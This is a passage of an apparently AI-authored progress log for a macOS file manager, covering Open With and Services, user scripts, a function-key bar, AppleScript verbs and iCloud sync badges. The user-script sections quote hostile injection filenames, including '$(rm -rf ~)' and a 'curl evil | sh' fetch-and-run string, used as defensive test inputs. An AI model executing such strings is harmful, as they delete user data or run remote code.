  the *directory*, this follows the *tab*), sits **immediately after Size** — the adjacency that is
  the whole reason the core measures logical bytes — and is **charged to Name**, never added on top.
  That generalized `currentColumnLayout`'s reclaim from one hardcoded ternary to a sum: left alone it
  would have under-reclaimed by 137 pt whenever both columns were up, ratcheting Name narrower on
  every toggle inside a repository. Verified live: pixel-identical headers across repeated toggles.
+14 tests → **678 core tests** (was 669) and **38 app tests** (was 33); `swift test` green, swiftformat
+ swiftlint-strict clean. The type-body gotcha re-fired twice and was paid down rather than
suppressed: `SizeBarTests` is its own file (`SizeVisualizationTests` was at its 250-line limit), and
`PanelViewController` crossed both file *and* type-body limits, so the FSEvents block moved to
`PanelViewController+Watch` along the seam its own `MARK` already drew. **VERIFIED LIVE** against the
real `~`: bars streamed in progressively, and with hidden rows shown the app rendered **Movies 1,08 TB
at 79.2 % filling the bar** and **Library 10.3 %** — matching the independent probe's 79.1802 % and
10.3339 % exactly, with `.lmstudio` observed *settling* 3.2 % → 2.8 % as `Library` landed (the
documented "share of what is known so far"). Toggling hidden rows re-scaled Movies 94.5 % → 79.2 %
(visible-rows-only denominators, live); **Zero KB folders drew no ink while 6 KB ones drew the floor**;
the `..` row drew nothing; the cursor row's bar used the emphasized fill; and the mode stayed in one
pane while the other browsed normally. Switching the mode off **keeps the computed sizes** — they are
Space-on-dir's too, not this mode's to erase. GOTCHA (cost ~20 minutes, and it is a trap for every
future live pass): **`xcodebuild` writes to `~/Library/Developer/Xcode/DerivedData/`, while the repo's
own `build/` directory is a stale copy** — `open build/.../Dirnex.app` silently ran a build from the
previous day, whose View menu was missing the new command *and* pass 8's terminal drawer. Two stale
instances were also already running. Launch from the DerivedData path, and check `ps` first.
**NEXT (M6 pass 11):** Share sheet / "Open With" / Services, then the automation slice (AppleScript/
Shortcuts verbs + user shell scripts on the selection) that M6's exit criteria actually name, then the
iCloud sync-status column. Deferred and still worth doing: extending `DirectoryWatcher` to deliver
event paths, which would keep size invalidation surgical instead of dropping a whole root-to-leaf line
per ping (the conservative rule is correct, just wasteful); and ncdu's `r` — an explicit
refresh/rescan, for which `DirectorySizeCache.removeAll` already exists unused.

Progress (2026-07-16, M6 pass 11 — Share sheet / Open With / Services; **the box closes `[x]`,
VERIFIED LIVE**): the three ways a file leaves this app for another one. Probing ran ahead of the
Swift again (the pass-1 method) and it decided the whole design — three findings, each of which the
obvious implementation would have got wrong:
- **LaunchServices answers per *type*, not per file, and asking is ~25x the cost of reading a type**
  (`urlsForApplications` 6.8 ms/100 vs `contentType` 0.27 ms/100). Two files of one type return
  **byte-identical** app lists, and the `UTType` overloads return exactly what the per-URL ones do
  (checked both). So the core is keyed on **distinct types**: a selection collapses to its types
  first and a thousand marked photos ask **once**. A test with a counting probe pins it, because it
  is the one thing holding a big selection's right-click under the frame budget.
- **The rule for a multi-file selection is intersection, and it bites immediately**: `a.txt` offers
  14 apps, `c.png` offers 8, and together they offer **3** — TextEdit and Preview both drop out.
  Anything less than intersection would list an app that opens half of what you picked.
- **A default is only offered when every type agrees on one** (unanimity), and it must survive the
  intersection. A mixed selection where the types disagree promotes **nothing**: "the app this opens
  in" over a menu that opens the other half in something else is a lie, and Finder doesn't tell it.
  An untypeable item (unknown extension → genuinely 0 apps; or a file deleted between listing and
  right-click → no type at all) **collapses the answer to empty** rather than being skipped — both
  mean "no app opens *every* item", and LaunchServices reaches the same answer on its own, just
  slower. `OpenWithApplications` + `ApplicationRef`/`OpenWithCandidates` are pure, with the probes
  injected exactly like `ExternalDiffTool`.
- **App layer**: `OpenWithLauncher` (the LaunchServices probes + launch; **one** launch for the whole
  selection, so twelve images are one Preview with twelve tabs, not twelve cold starts) and
  `PanelViewController+OpenWith`. Open With and Share are **registry commands that pop a menu, not
  menu-bar submenus** — ⌃T's shape: a File-menu submenu would have to find the focused pane from a
  static builder, while a command rides the responder chain, lands in ⌘K for free, and is rebindable.
  The right-click nests both as real submenus built from the **same items** (`openWithMenuItems`,
  mirroring `tagMenuItems` — an `NSMenuItem` lives in one menu at a time, so items are the shareable
  unit, not menus). All three gate on `handoffTargets` = the marked set, else the cursor, filtered to
  `.local` — the line `tagTargets` already draws, so it works from a results tab (virtual pane, real
  local hits) and greys inside an archive / on SFTP, which have no URL to hand over.
- **Services** is the smallest piece and the one with a real trap: `NSApp.servicesMenu` is
  **single-valued**, so Services lives in the app menu (where macOS puts it) and is *not* duplicated
  into the right-click — a second copy would take the population away from the first rather than
  getting its own. The integration is `registerServicesMenuSendTypes([.fileURL], returnTypes: [])` +
  the pane's `validRequestor`/`writeSelection`; AppKit then **auto-appends Services to the
  right-click menu by itself**, which the live run showed and no code here asked for.
- Two Swift-6 gotchas, both paid down via existing precedent rather than suppressed:
  `NSServicesMenuRequestor` carries no main-actor annotation → `@preconcurrency` conformance (the
  Quick Look panel's fix); and `NSWorkspace.open`'s callback is `@Sendable` and fires off-main, so
  `completion` couldn't reach it → the **`async` overload** inside a `Task` that inherits the main
  actor (`ExternalDiffLauncher`'s shape). GOTCHA (new): the pane is now the delegate of **two**
  submenus, and `menuNeedsUpdate` is handed the menu, not the item — without identifiers on each
  (`.tagsSubmenu` / `.openWithSubmenu`) opening Open With fills it with the **tag list**. Also
  `displayName`/`localizedName` answer **"TextEdit.app"**, extension and all, whenever Finder's
  hide-extensions is off — the name must come from the bundle's own `CFBundleDisplayName`, and an app
  test pins it.
+16 core tests → **694** (was 678) and +5 app tests → **43** (was 38); `swift test` + app
`xcodebuild test` green, swiftformat/swiftlint-strict clean. **VERIFIED LIVE** (launched from
DerivedData, `ps`-checked for stale instances first — last pass's trap): Open With over `notes.txt`
listed **TextEdit (default)** promoted and separated, then Code/Cursor/Chrome/…/Xcode alphabetically
with icons and **no ".app" suffixes**, then Other…; marking `notes.txt` + `photo.png` (marks
outranking a cursor parked on the unopenable file) re-listed exactly **Google Chrome, LibreOfficeDev,
Safari** — the probe's predicted intersection, to the app — with **nothing promoted**, the unanimity
rule on screen; `weird.zzzqqq` showed **"No Applications" + Other…**; the right-click carried Open
With ▸ / Share… / Services ▸; **Services listed real file services** (Show in Finder, Show Info in
Finder, Parallels' Open/Reveal in Windows), proving the requestor is being asked; **TextEdit actually
opened `notes.txt`** showing its real content; the **Share sheet** came up reading "notes · Text
Document · 18 bytes" with AirDrop/Mail/Messages (nothing was sent); and both commands **greyed out
inside a zip**. **NEXT (M6 pass 12):** the automation slice M6's exit criteria actually name —
AppleScript/Shortcuts verbs (reveal, copy, run-op) + user shell scripts receiving the selection as
argv/env, surfaced in the palette and F-key bar — then the iCloud sync-status column, which closes
M6. Optional polish now cheap: a **Settings picker for the preferred Open With app** (persist the
`ApplicationRef.bundleIdentifier` the core already carries for exactly this), and Finder's
⌥-toggles-to-"Always Open With".

Progress (2026-07-16, M6 interlude — right-click **Copy Path** everywhere paths live; VERIFIED LIVE):
user asked to copy a location as text from the context menu of a table row (incl. `..`), a path-bar
crumb, and the pane's empty space. A *textual* sibling of ⌘C (which writes file URLs) — new
`PathClipboard` (app) formats `[String]` → newline-joined text and writes it (an injectable
`NSPasteboard` so a test asserts without clobbering the real clipboard); 4 app tests pin the shape.
The three surfaces route to **three different path sources**, which is the whole subtlety: an entry
row copies `selectionTargets()` (so a marked set copies all of them, titled "Copy Paths"); the empty
space copies `panel.path`; and `..` copies **`panel.parentPath`, not the pane dir** — the two share
`backgroundMenu(directory:)` but `contextMenu(forRow:)` hands it the parent for `..`. The item
**captures its paths at build time** into `representedObject`, so a background refresh can't leave it
aimed at a stale row (same reason the crumb menu is built per-crumb, carrying `crumb.target.path`).
One trap avoided: decide entry-vs-`..` from `isParentRow(row)`, **not** the post-retarget
`cursorOnParentRow` — right-clicking a *marked* row leaves that flag untouched and would misread the
row as `..`. **VERIFIED LIVE** in the built app driven end to end: `old-code` row →
`/Users/oleg/jMeter/old-code`; `..` → `/Users/oleg` (parent, not the pane dir); empty space →
`/Users/oleg/jMeter`; the "Users" crumb → `/Users`; and a 2-mark selection → "Copy Paths" copying
`…/old-code\n…/results`. 698 core+app tests green, swiftformat + swiftlint clean.

Progress (2026-07-16, M6 pass 12 — the user-scripts automation core): the pure, tested half of the
automation item's exit-criterion feature ("a user-defined 'convert to webp' script on selection runs
from the palette"). Box stays `[ ]` — no store persistence, no process runner, no palette wiring, no
management UI yet; this is the model + invocation-building half, the same core-first opener every
M4/M5/M6 slice used. **Two new `DirnexCore/Services/` files, purely additive** (no existing-API
changes, so the app is untouched and needs no rebuild). Probing ran ahead of the Swift (the pass-1
method): the `sh -c 'body' name arg1 arg2` argv mapping (`$0`=name, `$1`=arg1, `$#`=count, spaces in
a path preserved as one element) and env/`cwd` passthrough were captured live before the model was
shaped, which fixed the whole security stance in place.
- **`UserScript.swift`** — `UserScript` (name-as-identity `command`+`runMode`+`keywords`, `Codable`,
  secret-free) plus its invocation machinery. `UserScriptRunMode` = `.combined` (one run, whole
  selection as `"$@"`) vs `.perFile` (one run per file, `$1` = that file — the webp case). A
  `UserScriptContext` (selection + both panel dirs) turns into `[UserScriptInvocation]` via
  `invocations(in:shell:)`: **`.combined` yields one invocation even for an empty selection** (a
  directory-scoped script still runs, via env), **`.perFile` yields zero** (nothing to act on).
  **THE SECURITY BOUNDARY, and the reason this is a tested core type, not app glue:** the script text
  is user-authored (trusted), but the *selected paths are attacker-controlled data* — unzip a
  download and you can be browsing a file named ``$(rm -rf ~)`` — so every path is handed to the
  shell as a **separate `argv` element** (`["-c", command, name] + files`) and as environment values,
  **never concatenated into the command text**. A hostile filename therefore arrives as one inert
  `"$1"` and cannot break out and execute — the same "a filename is attacker-controlled data" stance
  `ShellCommandLine` takes for the terminal drawer, pinned by a test that feeds
  ``/tmp/$(rm -rf ~); `curl evil | sh` && echo pwned.txt`` through and asserts it lands verbatim as a
  single argument with the body unchanged. Passing `name` as `$0` also makes the shell's own
  diagnostics read `<name>: …`. The `UserScriptEnvironment` contract (named constants, not magic
  strings) exports `DIRNEX_CURRENT_DIR` (= the process `cwd`), `DIRNEX_OTHER_DIR` (omitted when
  single-pane), `DIRNEX_SELECTION_COUNT`, and `DIRNEX_SELECTED_PATHS` (newline-joined — a documented
  convenience, since `"$@"` is the ambiguity-free authority for a filename that itself holds a
  newline). A palette bridge (`commandID` = `userScript.<name>`, its inverse `name(fromCommandID:)`,
  and `paletteCommand`) lets a script rank/render in ⌘K alongside the built-ins, keyed on the
  `userScript.` prefix so the app can route a pick to the runner instead of an AppKit selector.
- **`UserScripts.swift`** — the ordered, name-de-duplicated collection (a near-twin of
  `ServerConnections`: `save` overwrite-in-place-else-append, `remove`/`rename`/`move`, dedup on
  init *and* on `Codable` decode so a hand-edited store is sanitized), plus `paletteCommands` for the
  app to merge into the catalog.
+22 tests → **724 core tests** (two new suites: invocation shape incl. the empty-selection split, the
two security cases, the env contract, the command-id round-trip, and the collection's save/rename/
move/dedup/JSON rules). `swift test` green, swiftformat + swiftlint-strict clean; app target
untouched. **NEXT (M6 pass 13, the app layer that closes the box):** `UserScriptStore` (UserDefaults
JSON + change-notification, like `ServerConnectionStore`), a `UserScriptRunner` (`Process` per
invocation off-main, sequential, collecting exit codes + stderr, surfacing a failure summary and
leaning on the pane's existing FSEvents watch to show new files — the `ExternalDiffLauncher` shape),
palette dispatch (merge `UserScriptStore.load().paletteCommands` into `reload`, and route a
`userScript.*` pick in `runSelected` to `PanelViewController.runUserScript(_:)` via a
`representedObject`-carrying sender), a `PanelViewController+UserScript.swift` that builds the context
from `handoffTargets`/the two panes' dirs and resolves the shell, a right-click **Scripts ▸** submenu
(dynamic, like the tags/servers submenus), and a management surface to *create* scripts (a Settings
tab or an organizer sheet in the `FavoritesOrganizerController` idiom) — then VERIFY LIVE that a
user-defined script on a selection runs from the palette. After that: the **F-key bar** surface (a
TC-style function-key button row, which does not exist in the app yet), and the **AppleScript/
Shortcuts verbs** (reveal, copy, run-op — an AppKit scripting `sdef` / App Intents surface, the
separate automation mechanism the item also names), then the iCloud sync-status column, which closes
M6.

Progress (2026-07-16, M6 pass 13 — the user-scripts app layer; the exit-criterion feature ships,
**VERIFIED LIVE**). The automation box stays `[ ]` because the item also names the **F-key bar** and
the **AppleScript/Shortcuts verbs**, both still to come — but its headline promise, PLAN.md §M6's
exit criterion *"a user-defined 'convert to webp' script on selection runs from the palette"*, is now
real and proven end-to-end. Pass 12's tested `DirnexCore` core (`UserScript`/`UserScripts`) was joined
to AppKit through five new app files plus small wirings, in the same core→app rhythm every milestone
used. No core change (pass 12's 724 tests stand; +1 catalog test for the new command → **725 core**).
- **`UserScriptStore.swift`** — the persistence twin of `ServerConnectionStore`: one shared
  `UserScripts` as JSON in `UserDefaults` (`Dirnex.userScripts`), `load`/`save`, a change
  notification. Secret-free by construction (a script holds only its own shell text + metadata).
- **`UserScriptRunner.swift`** — the non-hermetic half, `ExternalDiffLauncher`'s shape: spawns each
  `UserScriptInvocation` off-main via `Process`, **sequentially** (a `perFile` "convert 400 photos"
  must not fork 400 processes at once), captures exit code + stderr, and reports a `RunOutcome`
  (silent on success — new files arrive via the pane's FSEvents watch, like a Service; a summary alert
  only on a non-zero exit / launch failure). **The one real design call:** a GUI process launched by
  LaunchServices inherits launchd's minimal `PATH`, so `cwebp`/`ffmpeg` wouldn't resolve — the runner
  **unions the standard tool dirs (Homebrew Apple-silicon + Intel, `/usr/bin`, …) onto the inherited
  `PATH`** rather than paying for a login-shell handshake per invocation. It merges the invocation's
  `DIRNEX_*` over the inherited env, sets the cwd, and drains stderr before `waitUntilExit` to dodge a
  full-pipe stall.
- **`PanelViewController+UserScript.swift`** — builds `UserScriptContext` from `handoffTargets`
  (local files only, the Open-With/Share line) + the active pane's dir (cwd/`DIRNEX_CURRENT_DIR`) +
  `host.panelCounterpart`'s dir (`DIRNEX_OTHER_DIR` when local); resolves the shell via
  `TerminalShell.login($SHELL)` (the drawer's resolution); `runUserScript(_:)` reads the script name
  from the sender's `representedObject` (one entry point for both the palette and the submenu),
  runs, and reports. A `perFile` script over an empty selection says "select files first" rather than
  launching zero processes. `manageUserScripts(_:)` opens the organizer; `scriptMenuItems()` builds
  the submenu; a `validateAutomationItem` helper folds into the pane's `validateMenuItem` chain (kept
  under the cyclomatic-complexity limit, like its siblings).
- **Palette dispatch** (`CommandPaletteController`): `reload` joins `CommandCatalog.all` with
  `UserScriptStore.load().paletteCommands` (read fresh each open, so a just-created script is
  searchable immediately); `runSelected` recognises a `userScript.*` id (`UserScript.name(fromCommandID:)`)
  and routes it to `runUserScript(_:)` via a synthetic `representedObject`-carrying `NSMenuItem`,
  everything else keeps the static `CommandBinding.selector` path. A new `file.manageScripts` catalog
  command (+ `CommandBinding` + File menu) makes the organizer reachable from the menu bar and palette.
- **Right-click Scripts ▸ submenu** (`+ContextMenu`): a third lazily-filled submenu (`menuNeedsUpdate`
  switched on the identifier, joining tags + Open With), listing each script then **Manage Scripts…**,
  in both the entry menu and the background menu (a `combined` script runs on the directory).
- **`UserScriptsOrganizerController.swift`** — the *create* surface (the `FavoritesOrganizer` idiom,
  grown to a master–detail): a list on the left (+/−), a form on the right (Name, a When-run popup
  `combined`/`perFile`, comma-separated palette Keywords, and a monospaced Command text view with
  quote/dash substitution off so a shell body survives verbatim), each edit written straight to the
  store; name is identity, so a name-field commit is a `rename` that reverts on a clash. GOTCHA
  (recurring): the master–detail tipped the class over SwiftLint `type_body_length` 250 → moved the
  Helpers cluster into a same-file `private extension` (which the rule doesn't count, and same-file
  extensions share the type's `private` scope, so nothing had to widen — unlike the *cross-file* split
  in `SyncDirectoriesController+DiffTable`).
- **App tests** (+5 → **52 app tests**): `UserScriptRunnerTests` spawns real `/bin/sh` to lock the
  runner's contract end-to-end — the cwd + merged `DIRNEX_*` env of a `combined` run, the per-file
  fan-out of `perFile`, empty-selection → zero launches, a non-zero exit surfaced with its stderr,
  and — the load-bearing one — **a file literally named ``$(touch pwned.txt)`` passed through and
  asserted to arrive as one inert `"$1"`, creating no `pwned.txt`** (the security boundary, proven at
  the spawn level, not just at invocation-building).
LIVE VERIFICATION (fixture: two real JPEGs + a text file in a seeded left pane, a second dir in the
right pane): the perFile **"To PNG"** script, run from ⌘K on the two marked photos, produced real
400×400 `photo1.png`/`photo2.png` on disk (one `sips` per file) that appeared via FSEvents; the
right-click **Scripts ▸** submenu listed "To PNG" + "Manage Scripts…"; the organizer **created a new
`combined` "Save List"** entirely through its UI (name, mode, keywords, command), which persisted to
`UserDefaults` and re-loaded on reopen; and running "Save List" from ⌘K wrote `_selection.txt`
containing the two marked paths as `"$@"`, `count=2` (`DIRNEX_SELECTION_COUNT`), and the right pane's
dir (`DIRNEX_OTHER_DIR`) — proving the argv + env contract live. (Aside: a *synthetic* ⌘K keystroke
from the automation harness didn't open the palette — the OS swallows it — but the View-menu item,
which shows ⌘K, opens it fine; that is a harness quirk, not an app defect.) `swift test` (725) + app
`xcodebuild test` (52) green, swiftformat + swiftlint-strict clean. **NEXT (M6):** the **F-key bar**
(a TC-style function-key button row — does not exist in the app yet; a natural home for both built-in
F-key ops and a user script's optional F-key binding), then the **AppleScript/Shortcuts verbs**
(reveal/copy/run-op — an `sdef`/App Intents surface), then the iCloud sync-status column, which closes
M6.

Progress (2026-07-16, M6 pass 14 — the F-key bar; **VERIFIED LIVE**): the Total-Commander function-key
button row along the window bottom. The automation box stays `[ ]` because the item's last piece — the
**AppleScript/Shortcuts verbs** — is still to come, but the F-key bar it also names is now real and
proven end-to-end. Core-first as always; one new core file, five app touch-points.
- **`DirnexCore/Services/FunctionBar.swift`** (pure, tested) — a `FunctionBarSlot` (`functionKey` +
  short `label` + `commandID`, `Codable`) and `FunctionBar.defaultSlots`: **F2 Rename · F3 View · F5
  Copy · F6 Move · F7 NewFolder · F8 Delete**. Data, not AppKit, so the layout is unit-tested and a
  later user-configurable bar (and a user script's F-key binding) is a change to *data*. Every slot
  names a real `CommandCatalog` command (a test pins it); `slot(forFunctionKey:)` is the pane key
  handler's lookup. +7 core tests → **740**.
- **THE key-dispatch insight (why the bar can own F3 with zero double-fire):** F2/F5–F8 already carry a
  bare-function-key **menu key-equivalent**, and AppKit fires a menu equivalent *before* the event ever
  reaches `keyDown`. So a `keyDown` F-key handler only ever *receives* the F-keys with **no** menu
  equivalent — F3 (Quick Look, whose own shortcut is ⌘Y) and, later, a user script's F9–F12 — and can
  dispatch them unconditionally without ever colliding with the menu. `FileTableView.keyDown` grew a
  `functionKeyNumber(for:)` decode (scalars in `NSF1FunctionKey…NSF35FunctionKey`) → a new
  `fileTable(_:functionKey:)` delegate call → `PanelViewController` looks up the slot and dispatches.
  **Live-proven:** pressing the physical **F3** opened Quick Look on `alpha.txt`, exactly the
  no-menu-equivalent path.
- **THE app-layer bug the live run caught, and the real design correction:** the first cut gave each
  button `target = nil` + `action = <selector>`, betting a nil-target dispatch would walk the responder
  chain to the active pane like a menu item does. **It silently no-op'd** — clicking a bottom-bar button
  (outside both panes) drops the pane's first-responder status *first*, so by the time the action
  dispatches, no responder in the key window implements `copyToOtherPane:`. A temporary `NSLog` at the
  dispatch site (app launched from Terminal to capture stderr — `open`-launched apps hide it) made it
  unambiguous: with the fix, `handled=true fr=FileTableView`; the menu path had always worked, isolating
  it to button dispatch. The fix: the button reports its slot to the bar's `onRun` callback; the window
  controller **re-focuses the active pane** (`focusedPanel.focusTable()`) **then** dispatches to nil —
  which both puts the pane back in the responder chain *and* matches TC, where a function-button click
  acts on the active pane and leaves focus there. GOTCHA for the live tester: a click that has to pass
  *through* a modal (cancelling a conflict sheet in the same batch) gets swallowed mid-animation — it
  reads as an intermittent button, but a deliberate single click is 100% reliable (proven by the log).
- **`FunctionBarView.swift`** — a `FunctionBarButton` (borderless, self-drawn: dim monospaced key token
  + primary caption, hover/press fills, a leading hairline on all but the first, `refusesFirstResponder`
  so a click never steals pane focus) in a `fillEqually` `NSStackView`, with a top hairline matching the
  column-header/queue-bar borders. Fixed 28 pt; the window controller owns the height constraint.
- **`BrowserWindowController+FunctionBar.swift`** + main-file layout — the bar is pinned at the **very
  bottom, below the queue bar** (so a running op surfaces its progress just above the buttons that
  started it), collapsed to zero height when off (the queue-bar collapse mechanism). App-wide visibility
  via `AppPreferences.showFunctionBar` (**default on** — a signature discoverability win, the "fix TC's
  adoption problem" goal) + `showFunctionBarDidChange`, so every window toggles together; a
  `view.functionBar` catalog command ("Show Function Key Bar", no shortcut) drives it from the View menu
  (checkmark via `validateToggleItem`), the ⌘K palette, and a Settings ▸ Panels toggle.
- +4 app tests (`FunctionBarViewTests`: every slot resolves to a wired selector; one button per slot
  carrying its slot + refusing focus; a click reports its slot to `onRun`) → **56 app**. `swift test`
  (740) + app `xcodebuild test` (56) green, swiftformat + swiftlint-strict clean. **VERIFIED LIVE**
  (fresh DerivedData build, `ps`-checked): the bar rendered the six buttons; the **F5 Copy** button
  copied the active pane's cursor/marked file to the other pane (raised the real per-file conflict sheet
  on a name clash, and cleanly landed `beta.txt` with no clash); the **F7 NewFolder** button opened the
  create sheet and made `made-by-f7`; **View ▸ Show Function Key Bar** toggled the bar away (panes
  reclaimed the strip) and back, its checkmark tracking; and the physical **F3** key opened Quick Look.
  KNOWN macOS caveat (not a bug): on a Mac keyboard F3/F5/… may be media keys unless "Use F1, F2 etc.
  as standard function keys" is set — the *buttons* always work regardless; the same caveat already
  applied to F5–F8. **NEXT (M6, closes the automation box):** the **AppleScript/Shortcuts verbs**
  (reveal/copy/run-op — an `sdef`/App Intents surface), plus optionally a user script's F-key binding
  (a slot pointing at a `userScript.<name>` command id — the bar and key handler already accept any
  command id, so it's a UI field on the organizer + one core field on `UserScript`). Then the iCloud
  sync-status column, which closes M6.

Refinement (2026-07-16, VERIFIED LIVE — three visual asks from the user): (1) **the bar no longer spans
under the sidebar** — it moved out of the window-wide container and into the *panes column*, a new
`makePaneColumnController` that wraps `[paneStackSplitViewController, functionBar]` as the outer split's
**second** item (the sidebar is the first and now stays full height beside it, exactly as the terminal
drawer already did). The queue bar stays full-width in the container below. (2) **Background is the
sidebar's vibrant material, not a flat fill** — the earlier `windowBackgroundColor` came out RGB(30,30,30),
a near-black neutral grey that read as "black"; the app's actual dark-*blue* is the sidebar's vibrancy, so
the bar now hosts an `NSVisualEffectView` with material **`.sidebar`** (probed live: `.windowBackground`
renders a flat grey, `.sidebar` carries the blue tint) behind the buttons, with an `NSBox` top hairline.
(3) **Buttons are rounded chips filling the height** — self-drawn `NSBezierPath(roundedRect:)` per state
(rest 0.07 / hover 0.14 / press 0.22 `labelColor` alpha, radius 6), the hairline separators dropped, a
`fillEqually` stack with 5 pt gaps and a 3 pt vertical inset, bar height 28→**32**. GOTCHA (recurring):
`makePaneColumnController` tipped `BrowserWindowController` over `type_body_length` 250 → moved both
view-builders into a same-file `private extension` (shares the type's `private` scope, doesn't count toward
the limit). Verified live: the bar sits flush right of the full-height sidebar, its blue matches the
sidebar, the F3 button still opened Quick Look (dispatch survives the reparent — `focusedPanel.focusTable()`
+ nil-target dispatch is independent of where the bar lives). One app test dropped (the leading-separator
invariant) → **55 app**; 740 core green, lint + format clean.

Progress (2026-07-17, M6 pass 15 — the AppleScript verbs; **the automation box closes `[x]`, VERIFIED
LIVE**): the last piece the automation item named — an AppleScript scripting surface — landed, so the
whole item (user scripts + palette + F-key bar from passes 12–14, now the verbs) is `[x]`. I chose
**AppleScript/`sdef`** over the App Intents/Shortcuts alternative the item also offers, for one decisive
reason: it is driveable and observable straight from `osascript`, so every verb was verified end-to-end
from the shell (App Intents would need a Shortcut authored in the Shortcuts app first). Core-first as
always: one new tested core file, then the `sdef` + Info.plist + handlers.
- **`DirnexCore/Services/Automation.swift`** (pure, tested) — three pieces the handlers lean on, so the
  Apple-event glue stays dumb. **`AutomationVerb`** (`.reveal`/`.copySelection`/`.runOperation`, each
  with its AppleScript `commandName`) is the one place the verb names live, referenced by the `sdef`,
  the tests, and error strings. **`AutomationReveal.target(forPOSIXPath:)`** turns a script's POSIX path
  into the `(container, item)` a panel navigates to — Finder semantics (a folder is selected *in its
  parent*, not entered), root has no item, a relative/empty path yields `nil`; `VFSPath` normalizes the
  slashes. **`AutomationOperation.resolve`** maps a free-text operation onto the flat command-id space:
  exact id, then menu title (case- and trailing-`…`-insensitive, so `rename` hits `file.rename`), then a
  user script by name or `userScript.<name>` id — **built-ins win over a like-named user script** (a
  test pins it). +13 core → **753**.
- **`Dirnex/Dirnex.sdef`** — a "Dirnex Suite" with `reveal` (text direct-param), `copy selection`, and
  `run operation` (text direct-param), each mapped to an `NSScriptCommand` subclass via `<cocoa class>`.
  Command names avoid AppleScript's `copy` language keyword (hence `copy selection`, not `copy`).
- **Info.plist via a merge, not a rewrite** — the project is `GENERATE_INFOPLIST_FILE = YES`, which has
  no `INFOPLIST_KEY_*` for the two keys AppleScript needs (`NSAppleScriptEnabled`,
  `OSAScriptingDefinition`). THE build call: add a **partial** `Dirnex/Info.plist` holding only those two
  keys and point `INFOPLIST_FILE` at it — modern Xcode **merges** it over the generated plist rather than
  replacing it (verified in the built bundle: both keys present *and* `CFBundleName` etc. still
  generated). The `.sdef` rides into `Contents/Resources/` automatically because `Dirnex/` is a
  file-system-synchronized group — no explicit resource reference needed.
- **`Dirnex/Scripting/ScriptingCommands.swift`** — the three `@objc(Dirnex…ScriptCommand)` subclasses
  (the `@objc` names are exactly the `sdef`'s `<cocoa class>` strings). Each decodes its direct
  parameter, then — since Apple events arrive on the main thread but `performDefaultImplementation` is
  nonisolated — does the UI work inside `MainActor.assumeIsolated`. **GOTCHA: `assumeIsolated`'s result
  must be `Sendable`, and `Any?` is not** — so the isolated closure returns a `Bool`/`Bool?` and the
  `Any?`/scriptError is built outside it. Failures set `scriptErrorNumber`/`scriptErrorString` so a
  script sees a real AppleScript `error` (proven live: an unknown op raised
  `"…" is not a known Dirnex operation. (-1728)`).
- **`Dirnex/Browser/BrowserWindowController+Scripting.swift`** — where a decoded verb meets the active
  pane. `runCommand(id:)` is now the **single dispatch path** shared by `run operation`/`copy selection`
  *and* the F-key bar (`runFunctionBarSlot` delegates to it), and it routes a `userScript.*` id to the
  script runner exactly as the ⌘K palette does — so bar, palette, and AppleScript can't drift.
- **THE two live-caught dispatch bugs (and the real fix):** first cut used `NSApp.sendAction(to: nil)`
  like the F-key bar. From a script it returned `false` and did nothing, because **an Apple event
  arrives while Dirnex is a *background* app — there is no key window, and `sendAction(to: nil)` starts
  at the key window's first responder.** Adding `NSApp.activate` + `makeKeyAndOrderFront` did **not**
  fix it: key-window status is granted **asynchronously**, so within the same synchronous handler there
  is *still* no key window. The fix: dispatch with **`window.firstResponder.tryToPerform(_:with:)`**,
  walking the active pane's *own* responder chain (table → pane → window → window controller), which
  doesn't depend on key status; `NSApp.sendAction` stays only as a fallback for the app-level commands
  (Settings/Quit) that sit above the window chain. `reveal` never had the bug — it calls `navigate`
  directly, not through the responder chain.
- **`DirnexTests/ScriptingCommandsTests.swift`** — pins the fragile Swift↔`sdef` string bridge: each
  `@objc` class resolves and is an `NSScriptCommand`; every `sdef` `<cocoa class>` resolves to one;
  the `sdef`'s command names are exactly the `AutomationVerb` set; and the bundle's Info.plist carries
  the two scripting keys pointing at `Dirnex.sdef`. +5 app → **60 app**.
- `swift test` (753) + app `xcodebuild test` (60) green, swiftformat + swiftlint-strict clean. **VERIFIED
  LIVE** (fresh DerivedData build, launched from Terminal, `ps`-checked): `osascript … reveal
  "/…/left/hello.txt"` returned `true` and the active pane navigated to `left/` with the cursor on
  `hello.txt`; with Dirnex **backgrounded behind Finder**, `copy selection` returned `true`, copied
  `hello.txt` left→right, and brought Dirnex forward (proving the `tryToPerform` fix); `run operation
  "go.parent"` (id) walked the pane up and `"Show Hidden Files"` (title) toggled hidden; an unknown op
  raised the AppleScript error above. The **F5 button still copies** after being rerouted through the
  shared `runCommand` (no regression). **NEXT (closes M6):** the iCloud/provider sync-status column
  (`NSFileManager` ubiquity attrs / `NSMetadataQuery` for download state). Optional, not required by the
  box: an **App Intents / Shortcuts** surface layered on the same `Automation` core, and a user script's
  F-key binding (the bar + key handler already accept any command id — a UI field on the organizer + one
  `UserScript` field).

Progress (2026-07-17, M6 pass 16 — the cloud sync badge; **the last M6 box closes `[x]`, VERIFIED
LIVE against real iCloud files**): the sync state of a file now rides at the right edge of its name.
**No column, by decision** — the plan said "column" for this the same way it said it for tags, and
both times the word was written before anyone had looked at Finder. Looking settled it: Finder draws
the cloud at the **trailing edge of the Name column**, and when a file is both tagged and not
downloaded it draws **the dots first and the cloud outermost** (measured — a file was evicted with
`brctl evict`, tagged, opened in Finder's list view and zoomed into). A column of our own would be
blank for every row of every folder on a Mac with no provider, which is most folders on most Macs.
The tags box was reworded to match what it has actually shipped since pass 4.

**The probe came first, and it earned its keep four times over** (the pass-1 `git` / pass-3 tags
method: a real `brctl evict`ed file, a download sampled every 20 ms, a 60 MB upload):

- **`isUbiquitousItem` is the only honest discriminator.** A `.DS_Store` *inside* iCloud Drive
  reports `isUbiquitous == false` and yet answers `.current` for its downloading status — so keying
  off the status, the obvious first draft, badges a local-only file as a synced cloud file. Outside a
  container every attribute is `nil` instead.
- **The downloading status lies during a download.** Sampling a real `brctl download` showed
  `isDownloading == true` while the status still read `NotDownloaded`, flipping to `.current` ~0.7 s
  later. Consulting the status first paints "in the cloud" over a file that is actively arriving —
  so the boolean is asked first, and a test pins it.
- **`isUploading` is not what reports an upload.** It stayed `false` for the whole of a 60 MB upload
  while `isUploaded` was `false` throughout; the *pending* flag is the real signal.
- **`NSURL` caches resource values on the instance.** Polling one `URL` object reported
  `NotDownloaded` for 37 s after the file had finished arriving; a fresh `URL` each poll saw it in
  700 ms. `CloudSyncStorage` builds and drops its own `URL` per read and says why in a comment —
  this is a bug that would only ever appear as "the badge is stuck".
